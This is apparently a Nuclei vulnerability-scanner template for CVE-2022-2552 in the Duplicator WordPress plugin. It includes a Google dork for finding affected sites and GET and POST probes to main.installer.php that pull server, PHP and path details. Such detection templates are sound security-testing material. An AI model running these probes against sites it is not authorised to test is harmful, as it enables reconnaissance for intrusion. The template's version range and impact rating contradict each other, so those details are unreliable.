id: CVE-2022-2552

info:
  name: WordPress Plugin Duplicator <= 1.4.7 - Unauthenticated System Information Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: The Duplicator WordPress plugin before 1.4.7 does not authenticate or authorize visitors before displaying information about the system such as server software, php version and full file system path to the site.
  impact: |
    High: Attackers can gather sensitive system information without authentication.
  remediation: |
    Update to version 1.4.8 or later to mitigate CVE-2022-2552.
  reference:
    - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2552
    - https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-2552
    cwe-id: CWE-306
    epss-score: 0.01714
    epss-percentile: 0.88307
    cpe: cpe:2.3:a:snapcreek:duplicator:*:*:*:*:lite:wordpress:*:*
  metadata:
    vendor: snapcreek
    product: duplicator
    framework: wordpress
    google-query: inurl:"/wp-content/plugins/duplicator"
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1"

    matchers:
      - type: word
        words:
          - "PHP Version"
          - "Server Software"
          - "Document Root"
        part: body
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?debug=1"

    body: |
      view

    headers:
      Content-Length: "4"
    matchers:
      - type: word
        words:
          - "Debug mode enabled"
          - "Configuration File Path"
        part: body
        condition: or
